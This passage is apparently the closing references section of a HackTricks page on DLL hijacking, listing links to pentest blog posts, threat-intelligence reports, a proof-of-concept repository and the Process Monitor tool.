- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
